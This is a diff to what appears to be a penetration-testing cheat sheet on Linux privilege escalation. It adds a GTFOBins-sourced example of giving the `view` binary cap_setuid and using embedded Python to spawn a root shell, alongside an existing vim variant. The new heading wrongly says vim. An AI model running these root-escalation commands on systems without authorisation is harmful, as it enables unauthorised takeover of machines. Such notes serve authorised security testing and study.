@@ -180,8 +180,20 @@ sudo setcap cap_setuid+ep vim
 
 ./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
 ```
+Be sure to change `py` to `py3` if the target system is running on python3.
 
+#### Abusing the Capability set on `vim`
+```
+/path/to/view = cap_setuid+ep
+```
+The following is extrected from [GTFO bins](https://gtfobins.github.io/gtfobins/view/)
+```
+cp $(which view) .
+sudo setcap cap_setuid+ep view
 
+./view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+```
+Be sure to change `py` to `py3` if the target system is running on python3.
 
-
+### Cron Jobs
 
